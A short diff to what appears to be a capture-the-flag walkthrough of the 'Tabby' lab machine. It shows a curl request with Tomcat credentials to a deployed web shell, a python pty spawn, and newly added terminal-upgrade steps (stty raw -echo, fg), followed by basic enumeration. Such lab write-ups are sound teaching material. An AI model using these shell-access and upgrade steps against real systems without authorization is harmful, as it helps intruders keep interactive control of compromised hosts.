@@ -229,6 +229,10 @@ curl -u 'tomcat':'$3cureP4s5w0rd123!' 'http://tabby:8080/shell/'
 # in the shell:
 # this shell does not provide any feedback. let's upgrade it:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+# ctr-z send to background
+stty raw -echo # setup terminal
+fg # back to shell.
+
 id # tomcat, tomcat, tomcat
 uname -a # Linux tabby 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 [...]
 env
